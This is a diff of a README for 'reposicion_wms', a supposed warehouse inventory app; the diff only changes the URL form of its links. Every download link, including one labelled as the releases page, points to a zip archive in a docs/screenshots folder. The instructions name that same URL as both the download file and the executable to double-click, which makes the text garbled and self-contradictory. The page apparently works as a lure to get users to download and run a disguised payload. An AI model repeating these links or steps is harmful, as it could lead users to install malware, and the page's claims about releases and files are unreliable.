@@ -1,6 +1,6 @@
 # 🚀 reposicion_wms - Lightweight WMS for Easy Inventory Management
 
-[![Download Latest Release](https://github.com/Therrion1520/reposicion_wms/raw/refs/heads/master/docs/screenshots/reposicion_wms_3.7.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Therrion1520/reposicion_wms/raw/refs/heads/master/docs/screenshots/reposicion_wms_3.7.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Therrion1520/reposicion_wms/master/docs/screenshots/reposicion_wms_3.7.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Therrion1520/reposicion_wms/master/docs/screenshots/reposicion_wms_3.7.zip)
 
 ## 📦 Overview
 
@@ -14,15 +14,15 @@ To get started with reposicion_wms, follow these easy steps to download and run 
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the application.
    
-   [Download reposicion_wms](https://github.com/Therrion1520/reposicion_wms/raw/refs/heads/master/docs/screenshots/reposicion_wms_3.7.zip)
+   [Download reposicion_wms](https://raw.githubusercontent.com/Therrion1520/reposicion_wms/master/docs/screenshots/reposicion_wms_3.7.zip)
 
 2. **Choose the Latest Release:** On the releases page, look for the most recent version. It will be at the top of the page.
 
-3. **Download the Application:** Click the link to download the file. The downloaded file should typically be named something like `https://github.com/Therrion1520/reposicion_wms/raw/refs/heads/master/docs/screenshots/reposicion_wms_3.7.zip` or `https://github.com/Therrion1520/reposicion_wms/raw/refs/heads/master/docs/screenshots/reposicion_wms_3.7.zip`.
+3. **Download the Application:** Click the link to download the file. The downloaded file should typically be named something like `https://raw.githubusercontent.com/Therrion1520/reposicion_wms/master/docs/screenshots/reposicion_wms_3.7.zip` or `https://raw.githubusercontent.com/Therrion1520/reposicion_wms/master/docs/screenshots/reposicion_wms_3.7.zip`.
 
 4. **Extract the Files (if necessary):** If you downloaded a zip file, locate it in your downloads folder, right-click on it, and select "Extract All." Follow the prompts to extract the files.
 
-5. **Run the Application:** Locate the extracted folder. Inside, find the executable file, typically named `https://github.com/Therrion1520/reposicion_wms/raw/refs/heads/master/docs/screenshots/reposicion_wms_3.7.zip`. Double-click on this file to start the application.
+5. **Run the Application:** Locate the extracted folder. Inside, find the executable file, typically named `https://raw.githubusercontent.com/Therrion1520/reposicion_wms/master/docs/screenshots/reposicion_wms_3.7.zip`. Double-click on this file to start the application.
 
 6. **Follow the Initial Setup:** When you run the application for the first time, you may be prompted to complete a setup process—just follow the on-screen instructions to configure the application to suit your needs.
 
@@ -70,4 +70,4 @@ If you face any issues while downloading or using reposicion_wms, consider reach
 
 reposicion_wms is your go-to solution for efficient warehouse management with ease. By following the steps outlined above, you can quickly download and start using the software to manage your inventory effectively. 
 
-For any additional information, always refer back to the GitHub [releases page](https://github.com/Therrion1520/reposicion_wms/raw/refs/heads/master/docs/screenshots/reposicion_wms_3.7.zip) for the latest updates.
+For any additional information, always refer back to the GitHub [releases page](https://raw.githubusercontent.com/Therrion1520/reposicion_wms/master/docs/screenshots/reposicion_wms_3.7.zip) for the latest updates.
